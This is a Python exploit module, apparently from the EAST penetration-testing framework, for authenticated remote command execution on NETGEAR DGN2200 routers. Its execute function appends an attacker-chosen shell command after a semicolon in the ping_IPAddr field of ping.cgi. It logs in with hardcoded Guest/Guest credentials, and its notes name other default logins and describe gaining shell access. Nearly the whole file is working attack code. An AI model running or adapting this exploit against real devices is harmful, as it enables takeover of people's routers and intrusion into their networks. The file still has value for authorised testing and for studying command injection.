#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import urllib
import urllib2
import base64
from time import sleep

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_netgear_dgn2200_router_rce"
INFO['DESCRIPTION'] = "NETGEAR DGN2200v1/v2/v3/v4 - 'ping.cgi' Remote Command Execution"
INFO['VENDOR'] = "https://www.netgear.com/"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/41394/']
INFO["CVE Name"] = ""
INFO["NOTES"] = """Gearguy/Geardog or Guest/Guest which are hardcoded on SOME firmware versions. These routers DO NOT support telnet/ssh access so you can use this exploit to access the shell if you want to"""

INFO['CHANGELOG'] = "20 Feb, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Hardware/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = "80", dict(description = 'Target port')
OPTIONS["COMMAND"] = 'ifconfig', dict(description = 'Command')
OPTIONS["USERNAME"] = 'Guest', dict(description = 'For auth ')
OPTIONS["PASSWORD"] = 'Guest', dict(description = 'For auth ')

class exploit(Sploit):
    def __init__(self, host="", port=0, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.command = ""
        self.username = ''
        self.password = ''
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.command = self.args.get('COMMAND', self.command)
        self.username = self.args.get('USERNAME', self.username)
        self.password = self.args.get('PASSWORD', self.password)
        
    
    def make_url(self, path = ''):
        return 'http://{}:{}{}'.format(self.host, self.port, path)
    
    def parseOutput(self, output):
        yet = False
        a = False
        result = []
        for line in output.splitlines():
            if line.startswith("<textarea"):
                yet = True
                continue
            if yet == True:             
                if line.startswith("</textarea>"):
                    break
                result.append(line)
        return result
    
    def execute(self, cmd):
        data = {'IPAddr1': 12, 'IPAddr2': 12, 'IPAddr3': 12, 'IPAddr4': 12, 'ping':"Ping", 'ping_IPAddr':"12.12.12.12; " + cmd}
        request = urllib2.Request(self.make_url('/ping.cgi'), urllib.urlencode(data))
        request.add_header('referer', 'http://192.168.0.1/DIAG_diag.htm')
        request.add_header('Authorization', "Basic " + base64.b64encode('{}:{}'.format(self.username, self.password)))
        
        fd = urllib2.urlopen(request)
        return self.parseOutput(fd.read())
    
    def run(self):
        self.args()
        
        self.log('Try to use exploit with authenticated injection')
        try:
            self.execute(self.command)
        except Exception as e:
            self.log(e)
            self.finish(False)
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()

